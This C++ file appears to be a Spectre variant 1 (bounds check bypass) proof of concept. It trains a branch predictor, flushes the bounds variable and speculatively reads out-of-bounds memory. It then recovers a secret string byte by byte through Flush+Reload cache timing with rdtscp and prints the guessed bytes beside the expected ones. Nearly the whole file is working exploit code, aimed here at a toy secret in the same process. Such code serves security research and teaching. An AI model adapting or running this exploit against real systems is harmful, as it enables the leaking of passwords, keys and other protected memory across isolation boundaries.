#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <emmintrin.h>
#include <sched.h>
#include <stdint.h>
#include <sys/mman.h>
#include <x86intrin.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef CACHELINE_SIZE
#define CACHELINE_SIZE 64
#endif
#ifndef ITERS
#define ITERS 1000
#endif
#ifndef TRAIN_REPS
#define TRAIN_REPS 100
#endif
#ifndef THRESHOLD
#define THRESHOLD 120
#endif
#ifndef ARRAY_SIZE
#define ARRAY_SIZE 16
#endif
#ifndef NUM_PAGES
#define NUM_PAGES 256
#endif

static volatile size_t array_size = ARRAY_SIZE;
static unsigned char public_array[ARRAY_SIZE];
static unsigned char *array = public_array;
static unsigned char *probe_buf;
static volatile unsigned char temp = 0;
static const char secret[] = "this is my super secret value!";

__attribute__((noinline))
static void victim(size_t x) {
    _mm_clflush((void *)&array_size);
    _mm_lfence();

    if (x < array_size) {
        unsigned char secret_byte = array[x];
        volatile unsigned char x = probe_buf[PAGE_SIZE * secret_byte];
    }
}

static inline long time_load(void *ptr) {
    unsigned int junk = 0;
    unsigned long long start = __rdtscp(&junk);
    *(volatile unsigned char *)ptr;
    return (long)(__rdtscp(&junk) - start);
}

#define TIME_LOAD(ptr) time_load((void *)(ptr))

static unsigned int lcg_next(unsigned int state) {
    return state * 1664525u + 1013904223u;
}

static int probe(void *buf, int num_slots, int threshold, int *order, unsigned int *lcg_state) {
    for (int i = 0; i < num_slots; ++i) {
        order[i] = i;
    }
    for (int i = num_slots - 1; i > 0; --i) {
        *lcg_state = lcg_next(*lcg_state);
        int j = (int)(*lcg_state % (unsigned int)(i + 1));
        int tmp = order[i];
        order[i] = order[j];
        order[j] = tmp;
    }

    for (int i = 0; i < num_slots; ++i) {
        int page = order[i];
        char *ptr = (char *)buf + page * PAGE_SIZE;
        if (TIME_LOAD(ptr) < threshold) {
            return page;
        }
    }

    return -1;
}

void* alloc_buf(int num_pages) {
    void* buf = mmap(NULL, PAGE_SIZE*num_pages, PROT_READ | PROT_WRITE
        , MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (buf == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    memset(buf, 1, PAGE_SIZE*num_pages);

    return buf;
}

void flush_buffer(void* buf, int buf_sz) {
    for (int i = 0; i < buf_sz; i += CACHELINE_SIZE) {
        _mm_clflush((char*)buf + i);
    }
    _mm_lfence();
}

static void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        perror("sched_setaffinity");
        exit(1);
    }
}

__attribute__((noinline))
void initialize_array() {
    for (int i = 0; i < ARRAY_SIZE; ++i) {
        array[i] = (unsigned char)(i + 1);
    }
}

static void train_then_attack(size_t malicious_x, unsigned int attempt) {
    size_t training_x = attempt % ARRAY_SIZE;

    for (volatile int j = 0; j <= TRAIN_REPS; ++j) {
        size_t x = (j == TRAIN_REPS) ? malicious_x : training_x;
        victim(x);
    }
}

int main() {
    const int cpu = 0;
    const int secret_len = (int)strlen(secret);
    char guessed[sizeof(secret)] = {};
    uintptr_t diff = (uintptr_t)secret - (uintptr_t)array;

    pin_cpu(cpu);
    initialize_array();

    probe_buf = (unsigned char *)alloc_buf(NUM_PAGES);

    int order[NUM_PAGES];
    unsigned int lcg_state = 1;

    printf("array=%p secret=%p malicious_base_x=%zu\n",
           (void *)array, (const void *)secret, (size_t)diff);

    for (int byte = 0; byte < secret_len; ++byte) {
        int scores[NUM_PAGES] = {};
        size_t malicious_x = (size_t)(diff + (uintptr_t)byte);

        for (int i = 0; i < ITERS; ++i) {
            flush_buffer(probe_buf, PAGE_SIZE * NUM_PAGES);
            train_then_attack(malicious_x, (unsigned int)i);

            int found = probe(probe_buf, NUM_PAGES, THRESHOLD, order, &lcg_state);
            if (found >= 0) {
                scores[found]++;
            }
        }

        int best = -1;
        int best_count = 0;
        for (int page = 0; page < NUM_PAGES; ++page) {
            if (page >= 1 && page <= ARRAY_SIZE) {
                continue;
            }
            if (scores[page] > best_count) {
                best = page;
                best_count = scores[page];
            }
        }

        guessed[byte] = best >= 0 ? (char)best : '_';
        printf("secret[%2d]: best=0x%02x hit_rate=%.2f%%\n",
               byte, best, 100.0 * (double)best_count / (double)ITERS);
    }

    printf("expected: %s\n", secret);
    printf("received: %s\n", guessed);
    return temp;
}
